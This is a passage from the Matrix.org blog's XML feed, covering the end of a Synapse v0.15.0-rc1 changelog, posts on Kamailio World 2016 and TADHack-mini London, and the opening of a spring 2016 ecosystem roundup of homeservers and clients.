 	&lt;li&gt;Change CacheMetrics to be quicker (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;830&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;830&quot; data-id=&quot;158337903&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#830&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;changes-in-synapse-v0-15-0-rc1-2016-04-26&quot;&gt;Changes in synapse v0.15.0-rc1 (2016-04-26)&lt;&#x2F;h3&gt;
&lt;p&gt;Features:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Add login support for Javascript Web Tokens, thanks to Niklas Riekenbrauck (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;671&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;671&quot; data-id=&quot;144065761&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#671&lt;&#x2F;a&gt;,&lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;687&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;687&quot; data-id=&quot;145233458&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#687&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add URL previewing support (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;688&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;688&quot; data-id=&quot;145553608&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#688&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add login support for LDAP, thanks to Christoph Witzany (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;701&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;701&quot; data-id=&quot;146343240&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#701&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add GET endpoint for pushers (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;716&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;716&quot; data-id=&quot;147499520&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#716&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Changes:
&lt;ul&gt;
 	&lt;li&gt;Never notify for member events (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;667&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;667&quot; data-id=&quot;143242675&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#667&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Deduplicate identical &lt;code&gt;&#x2F;sync&lt;&#x2F;code&gt; requests (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;668&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;668&quot; data-id=&quot;143315296&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#668&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Require user to have left room to forget room (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;673&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;673&quot; data-id=&quot;144534572&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#673&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Use DNS cache if within TTL (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;677&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;677&quot; data-id=&quot;144834970&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#677&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Let users see their own leave events (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;699&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;699&quot; data-id=&quot;146331932&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#699&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Deduplicate membership changes (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;700&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;700&quot; data-id=&quot;146337782&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#700&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Increase performance of pusher code (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;705&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;705&quot; data-id=&quot;146665406&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#705&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Respond with error status 504 if failed to talk to remote server (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;731&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;731&quot; data-id=&quot;148606730&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#731&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Increase search performance on postgres (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;745&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;745&quot; data-id=&quot;150119333&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#745&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Bug fixes:
&lt;ul&gt;
 	&lt;li&gt;Fix bug where disabling all notifications still resulted in push (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;678&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;678&quot; data-id=&quot;144837338&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#678&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix bug where users couldn&#x27;t reject remote invites if remote refused (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;691&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;691&quot; data-id=&quot;145946732&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#691&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix bug where synapse attempted to backfill from itself (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;693&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;693&quot; data-id=&quot;145966417&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#693&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix bug where profile information was not correctly added when joining remote rooms (PR &lt;a class=&quot;issue-link js-issue-link&quot; title=&quot;Set profile information when joining rooms remotely&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;703&quot; data-id=&quot;146548756&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#703&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix bug where register API required incorrect key name for AS registration (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;727&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;727&quot; data-id=&quot;148368853&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#727&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Kamailio World 2016</title>
        <published>2016-05-23T00:00:00+00:00</published>
        <updated>2016-05-23T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2016/05/23/kamailio-world-2016/" type="text/html"/>
        <id>https://matrix.org/blog/2016/05/23/kamailio-world-2016/</id>
        
        <content type="html">&lt;img src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;05&#x2F;kamailio-world-banner-2016-300x134.png&quot; alt=&quot;kamailio-world-banner-2016-300x134&quot; width=&quot;300&quot; height=&quot;134&quot; class=&quot;alignleft size-full wp-image-1624&quot; &#x2F;&gt;
&lt;p&gt;Last week I went to &lt;a href=&quot;https:&#x2F;&#x2F;www.kamailioworld.com&#x2F;k04&#x2F;&quot;&gt;Kamailio World 2016&lt;&#x2F;a&gt; in Berlin to meet fellow VoIP-developers and tell them all about Matrix. It&#x27;s a fairly small conference, which is actually quite nice as it means you get to talk to almost everyone. A lot of people were interested in Matrix - both new and familiar faces - in fact, some of them heard about Matrix &lt;a href=&quot;&#x2F;blog&#x2F;2015&#x2F;06&#x2F;01&#x2F;matrix-wins-most-entertaining-demo-at-kamailio-world&#x2F;&quot;&gt;a year ago at Kamailio World 2015&lt;&#x2F;a&gt; and were interested in hearing what progress we&#x27;ve made since.&lt;&#x2F;p&gt;
&lt;p&gt;As always, Matrix participated in &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=QkjIIh0cqcM&amp;t=9m&quot;&gt;James Body&#x27;s dangerous demos session&lt;&#x2F;a&gt; - and I also gave a &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=oV4WHaCJh2k&quot;&gt;30min talk on Matrix and recent updates&lt;&#x2F;a&gt; to a full room on the first day of the conference. &lt;&#x2F;p&gt;
&lt;p&gt;Several people mentioned that Matrix could be interesting to their project, either as a glue between services, or for adding text-based chat to VoIP apps. I hope to see some of you in Matrix at some point - please join us in &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&#x2F;beta&#x2F;#&#x2F;room&#x2F;#matrix:matrix.org&quot;&gt;#matrix:matrix.org&lt;&#x2F;a&gt; and say hi! It&#x27;s also a good place to ask questions and discuss how Matrix can work with your project. Auf Wiedersehen!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>TADHack-mini London</title>
        <published>2016-03-31T00:00:00+00:00</published>
        <updated>2016-03-31T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2016/03/31/tadhack-mini-london-2/" type="text/html"/>
        <id>https://matrix.org/blog/2016/03/31/tadhack-mini-london-2/</id>
        
        <content type="html">&lt;img src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;03&#x2F;tadhack-2016-mini-london-banner.png&quot; alt=&quot;tadhack-2016-mini-london-banner&quot; width=&quot;260&quot; height=&quot;180&quot; class=&quot;alignright size-full wp-image-1589&quot; &#x2F;&gt;
&lt;p&gt;It&#x27;s soon time for the 2nd &lt;a href=&quot;http:&#x2F;&#x2F;tadhack.com&#x2F;2016&#x2F;mini-london&#x2F;&quot;&gt;TADHack-mini London&lt;&#x2F;a&gt;. The event starts at 10am on Saturday April 9th and hacking continues until the projects are pitched, starting at 1pm on Sunday April 10th. As you can see by the &lt;a href=&quot;&#x2F;blog&#x2F;posts&#x2F;?s=tadhack&quot;&gt;many previous TADHacks&lt;&#x2F;a&gt;, every hackathon brings interesting and impressive projects, so we are again expecting great things! &lt;&#x2F;p&gt;
&lt;p&gt;As usual, there are great prizes to be won - worth around $5k in total. This time, we will award the best Matrix-related hack a &lt;a href=&quot;http:&#x2F;&#x2F;www.trossenrobotics.com&#x2F;phantomx-ax-hexapod.aspx&quot;&gt;PhantomX AX Metal Hexapod Mark III&lt;&#x2F;a&gt; from Trossen Robotics, a build-it-yourself hexapod robot kit! The robot is built on an entirely open source platform, complete with 3D cad models of the robot, open software, and schematics for the electronics.&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;03&#x2F;hexeh-big2.jpg&quot; alt=&quot;hexeh-big2&quot; width=&quot;577&quot; height=&quot;400&quot; class=&quot;aligncenter size-full wp-image-1591&quot; &#x2F;&gt;
&lt;p&gt;If you&#x27;re planning to attend TADHack-mini London: see you there! If not - why aren&#x27;t you? Consider spending a day and a half hacking on some cool technologies - it could be well worth your time! &lt;&#x2F;p&gt;
&lt;p&gt;You can be one step ahead by getting acquainted with the Matrix &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;r0.0.1&#x2F;client_server.html&quot;&gt;C-S API&lt;&#x2F;a&gt; or the &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;r0.0.1&#x2F;application_service.html&quot;&gt;AS API&lt;&#x2F;a&gt;. And if you have any questions - or want to discuss potential hacks - please come talk to us in &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&#x2F;beta&#x2F;#&#x2F;room&#x2F;#matrix:matrix.org&quot;&gt;#matrix:matrix.org&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>The Matrix Spring Special!</title>
        <published>2016-03-26T00:00:00+00:00</published>
        <updated>2016-03-26T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2016/03/26/the-matrix-spring-special/" type="text/html"/>
        <id>https://matrix.org/blog/2016/03/26/the-matrix-spring-special/</id>
        
        <content type="html">&lt;p&gt;It&#x27;s been 3 months since the &lt;a href=&quot;&#x2F;blog&#x2F;2015&#x2F;12&#x2F;25&#x2F;the-matrix-holiday-special&#x2F;&quot;&gt;Matrix Holiday Special&lt;&#x2F;a&gt; and once again we&#x27;ve all been too busy writing code to put anything that detailed on the blog.  So without further a do here&#x27;s a quick overview of how things have progressed so far in 2016!&lt;&#x2F;p&gt;
&lt;h3 id=&quot;home-servers&quot;&gt;Home servers&lt;&#x2F;h3&gt;
&lt;br&#x2F;&gt;
&lt;h4 id=&quot;synapse&quot;&gt;Synapse&lt;&#x2F;h4&gt;
&lt;p&gt;Work on &lt;a href=&quot;http:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&quot;&gt;Synapse&lt;&#x2F;a&gt; (our reference homeserver) has been primarily focused on improving performance.  This may sound boring, but there&#x27;s been a huge amount of improvement here since synapse 0.12 was released on Jan 4. Synapse 0.13 on Feb 10 brought huge CPU savings thanks to a whole fleet of caching and other optimisation work - the best way of seeing the difference here is to look at the load graph of the server that hosts matrix.org&#x27;s synapse+postgres over the last few months:&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;03&#x2F;matrix-org-load.png&quot; alt=&quot;matrix-org-load&quot; width=&quot;497&quot; height=&quot;173&quot; class=&quot;aligncenter size-full wp-image-1563&quot; &#x2F;&gt;
&lt;p&gt;Ignoring the unrelated blip during March, you can see an enormous step change in system load (which had a matching decrease in actual CPU usage) at the beginning of Feb when the 0.13 optimisations landed on matrix.org :)&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, Synapse 0.14 is due any day now with &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.14.0-rc2&quot;&gt;0.14.0-rc2&lt;&#x2F;a&gt; released on Wednesday.  Here, the focus has been all about memory optimisation - anyone who&#x27;s run a Synapse seriously will be aware that it can be a memory hog thanks to aggressively caching as much state and history in RAM as possible to avoid hitting the database and keeping everything responsive.  0.14 should improve memory usage just as dramatically as 0.13 improved CPU utilisation - introducing a quick-and-dirty SYNAPSE_CACHE_FACTOR environment variable that lets admins dial down the aggressiveness of the caching (at the expense of performance), but more interestingly implementing string interning and ensuring that events are cached by ID rather than duplicated across multiple caches in order to make memory usage more efficient.  It&#x27;s too early to have impressive looking graphs, and there are still a few memory spikes being tracked down before we release 0.14, but we&#x27;re hoping for at least a 50% reduction in memory footprint.&lt;&#x2F;p&gt;
&lt;p&gt;Featurewise the highlights include: server-generated unread notification &amp;amp; highlight counts and push badge support, lots of support and refinements for guest access and 3rd party ID invites.  Meanwhile we&#x27;ve finally fixed some of the most embarrassing long-standing missing features such as letting folks logout serverside(!), delete aliases and determine whether rooms should be published in the room directory or not. &lt;&#x2F;p&gt;
&lt;p&gt;Finally, Synapse is now part of &lt;a href=&quot;http:&#x2F;&#x2F;www.freshports.org&#x2F;net&#x2F;py-matrix-synapse&#x2F;&quot;&gt;FreeBSD Ports&lt;&#x2F;a&gt; thanks to Brendan Molloy, and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;NixOS&#x2F;nixpkgs&#x2F;blob&#x2F;master&#x2F;nixos&#x2F;modules&#x2F;services&#x2F;misc&#x2F;matrix-synapse.nix&quot;&gt;NixOS&lt;&#x2F;a&gt; thanks to Robin Lambertz!  Huge thanks to them for contributing the packages to the respective OSes and to all the other synapse package maintainers out there!&lt;&#x2F;p&gt;
&lt;p&gt;It&#x27;s incredibly exciting to see Synapse&#x27;s maturity improving and hitting the optimisation stage of its life; huge kudos to Erik for spearheading the optimisation work.  We strongly recommend folks upgrade to 0.14 when it&#x27;s available; it&#x27;s never been a better time to run a homeserver! :D&lt;&#x2F;p&gt;
&lt;br&#x2F;&gt;
&lt;h4 id=&quot;dendron&quot;&gt;Dendron&lt;&#x2F;h4&gt;
&lt;p&gt;Meanwhile, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;dendron&quot;&gt;Dendron&lt;&#x2F;a&gt; (our next generation homeserver) development has been progressing interestingly: we finished an initial spike to get a Golang skeleton server in place, albeit one that delegates most of the endpoints through to Synapse.  In fact, matrix.org itself has been running via Dendron since February!&lt;&#x2F;p&gt;
&lt;p&gt;The whole point of Dendron is to provide an architecture where we can split apart the various endpoints that Synapse provides today, re-implementing them where appropriate in Golang, and critically letting the endpoints scale horizontally with clusters of backend servers abstracted by the single Dendron API facade.  As a result, most of the Dendron work has actually ended up going into restructuring Synapse such that multiple Synapses can be run in a cluster behind a single Dendron, allowing us to horizontally scale API endpoints at last.  This takes the form of adding &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;commit&#x2F;1acc319070c0390d2330003bdc1e71cc66383dbb&quot;&gt;cluster replication support&lt;&#x2F;a&gt; to Synapse.  This is still work-in-progress as we go through fixing up more and more state to be replicable (replicatable?) between synapses - hopefully it should land in the Synapse 0.15 timeframe.  And then we enter a very very interesting new world of horizontally scalable homeservers...&lt;&#x2F;p&gt;
&lt;br&#x2F;&gt;
&lt;h4 id=&quot;ruma&quot;&gt;Ruma&lt;&#x2F;h4&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.ruma.io&#x2F;&quot;&gt;Ruma&lt;&#x2F;a&gt; has also seen some progress over the last few months - Ruma is an independent Rust language homeserver project led by Jimmy Cuadra, and whilst in early development still (currently focusing on the user login and registration system) shows a lot of promise.  Lots of work has ended up going into the required Rust dependencies rather than the Matrix code itself, but if you&#x27;re interested in Rust then please drop by &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&#x2F;beta&#x2F;#&#x2F;room&#x2F;#ruma:matrix.org&quot;&gt;#ruma:matrix.org&lt;&#x2F;a&gt; or #ruma on Freenode and say hi!&lt;&#x2F;p&gt;
&lt;br&#x2F;&gt;
&lt;h3 id=&quot;clients&quot;&gt;Clients&lt;&#x2F;h3&gt;
&lt;p&gt;Whilst homeserver development is mainly all about performance and scaling work currently, the client side of the Matrix ecosystem is the polar opposite - with lots of rapid progress on exciting new clients happening from all over the community.&lt;&#x2F;p&gt;
&lt;br&#x2F;&gt;
&lt;h4 id=&quot;perpetually-talking-online-pto&quot;&gt;Perpetually Talking Online (PTO)&lt;&#x2F;h4&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;pto.im&#x2F;&quot;&gt;PTO&lt;&#x2F;a&gt; has evolved enormously since Torrie Fischer first revealed it at the end of 2015.  PTO is an independent project that acts as a Matrix client that exposes an IRC server interface - effectively turning any Matrix homeserver into an ircd; letting folks hook their favourite IRC clients directly into Matrix and use it as an enormous decentralised IRC network.  (N.B. this is not to be confused with &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-irc&quot;&gt;matrix-appservice-irc&lt;&#x2F;a&gt;, which acts as a server-side bridge between Matrix rooms and IRC channels.)  Obviously you lose some of the Matrix specific features (read receipts, typing notifs, VoIP, etc) but there&#x27;s clearly a huge benefit for the IRC community to be able to use Matrix as if it were an IRC network.&lt;&#x2F;p&gt;
&lt;p&gt;There have been three releases so far, with the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;tdfischer&#x2F;pto&#x2F;releases&quot;&gt;v0.3.0 (&amp;quot;Carburetor&amp;quot;) release&lt;&#x2F;a&gt; in March being tantalisingly close to being usable for everyday purposes.  We actually have pto.matrix.org all set up and ready to go as an IRC frontend for the matrix.org homeserver and once &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;tdfischer&#x2F;pto&#x2F;issues&#x2F;60&quot;&gt;issue #60&lt;&#x2F;a&gt; is resolved we&#x27;ll be turning it on :)&lt;&#x2F;p&gt;
&lt;p&gt;There&#x27;s one catch though - XChat was never quite built to handle the hundreds of rooms that we&#x27;ve got used to Matrix supporting... :D&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;03&#x2F;Screen-Shot-2016-03-26-at-00.17.08-988x1024.png&quot; alt=&quot;Screen Shot 2016-03-26 at 00.17.08&quot; width=&quot;988&quot; height=&quot;1024&quot; class=&quot;aligncenter size-large wp-image-1565&quot; &#x2F;&gt;
&lt;p&gt;Come hang out in &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&#x2F;beta&#x2F;#&#x2F;room&#x2F;#pto:oob.systems&quot;&gt;#pto:oob.systems&lt;&#x2F;a&gt; if you&#x27;re interested in PTO!&lt;&#x2F;p&gt;
&lt;br&#x2F;&gt;
&lt;h4 id=&quot;quaternion&quot;&gt;Quaternion&lt;&#x2F;h4&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Fxrh&#x2F;Quaternion&quot;&gt;Quaternion&lt;&#x2F;a&gt; is a new Qt&#x2F;QML&#x2F;C++ desktop client created by Felix Rohrbach.  It&#x27;s a fairly early alpha but still quite usable and in very active development. &lt;a href=&quot;https:&#x2F;&#x2F;vector.im&#x2F;beta&#x2F;#&#x2F;room&#x2F;#quaternion:matrix.org&quot;&gt;#quaternion:matrix.org&lt;&#x2F;a&gt; is the place to talk all things Quaternion :)&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;03&#x2F;quaternion-1024x702.png&quot; alt=&quot;quaternion&quot; width=&quot;1024&quot; height=&quot;702&quot; class=&quot;aligncenter size-large wp-image-1566&quot; &#x2F;&gt;
&lt;br&#x2F;&gt;
&lt;h4 id=&quot;matrix-glib-sdk&quot;&gt;matrix-glib-sdk&lt;&#x2F;h4&gt;
&lt;p&gt;Meanwhile, over on the GTK side of the world, Gergely Polonkai has been been making great progress on his &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;gergelypolonkai&#x2F;matrix-glib-sdk&quot;&gt;matrix-glib-sdk&lt;&#x2F;a&gt; Glib client SDK for Matrix.  The end goal here is to implement a full &lt;a href=&quot;https:&#x2F;&#x2F;telepathy.freedesktop.org&quot;&gt;Telepathy&lt;&#x2F;a&gt; plugin for Matrix on top of the SDK.  Originally written in C, but now shifted to Vala, the SDK is in very active development and now implements all(?) of the Matrix client-server API - a snapshot of the work-in-progress SDK API docs can be found at &lt;a href=&quot;http:&#x2F;&#x2F;gergely.polonkai.eu&#x2F;matrix-glib-sdk&#x2F;&quot;&gt;http:&#x2F;&#x2F;gergely.polonkai.eu&#x2F;matrix-glib-sdk&lt;&#x2F;a&gt;.  Next up is a formal release and building out clients on top!&lt;&#x2F;p&gt;
&lt;br&#x2F;&gt;
&lt;h4 id=&quot;matrix-react-sdk-matrix-ios-sdk-matrix-android-sdk-and-vector&quot;&gt;matrix-react-sdk, matrix-ios-sdk, matrix-android-sdk and Vector&lt;&#x2F;h4&gt;
&lt;p&gt;Finally, huge amounts of time and effort have continued to be pumped into the official &lt;a href=&quot;http:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-react-sdk&quot;&gt;matrix-react-sdk&lt;&#x2F;a&gt;, &lt;a href=&quot;http:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-ios-sdk&quot;&gt;matrix-ios-sdk&lt;&#x2F;a&gt; and &lt;a href=&quot;http:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-android-sdk&quot;&gt;matrix-android-sdk&lt;&#x2F;a&gt; - driven substantially by requirements for &lt;a href=&quot;http:&#x2F;&#x2F;vector.im&quot;&gt;Vector&lt;&#x2F;a&gt;, the &lt;a href=&quot;http:&#x2F;&#x2F;github.com&#x2F;vector-im&quot;&gt;FOSS&lt;&#x2F;a&gt; Matrix-powered collaboration app that we&#x27;ve been helping with:&lt;&#x2F;p&gt;
&lt;br&#x2F;&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;03&#x2F;Screen-Shot-2016-03-21-at-14.39.16-1024x753.png&quot; alt=&quot;Screen Shot 2016-03-21 at 14.39.16&quot; width=&quot;1024&quot; height=&quot;753&quot; class=&quot;aligncenter size-large wp-image-1567&quot; &#x2F;&gt;
&lt;p style=&quot;text-align: center&quot;&gt;
